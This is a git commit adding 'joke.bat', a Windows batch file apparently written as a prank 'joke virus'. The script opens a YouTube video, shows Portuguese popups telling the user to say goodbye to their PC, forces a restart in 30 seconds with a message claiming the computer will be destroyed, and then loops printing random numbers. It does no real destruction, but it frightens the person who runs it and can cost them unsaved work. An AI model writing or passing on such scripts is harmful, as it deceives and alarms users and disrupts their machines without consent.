370e50c43c8b73d8a78d4053ca446bdf6c5da920
WilliamBraz2004 <willbrancocamposbraz@gmail.com>
2022-03-11 14:34:58 -0300

    joke_virus_test

---
+++ joke.bat
@@ -0,0 +1,16 @@
+@echo off
+
+color 2
+start www.youtube.com/watch?v=u9WsZoceais
+
+md 
+
+msg * Ola amigo =)
+
+msg * Voce nao deveria ter aberto este arquivo.
+
+msg * Diga adeus ao seu PC.
+shutdown -r -t 30 -c "Seu computador sera destruido"
+:x
+echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
+goto x
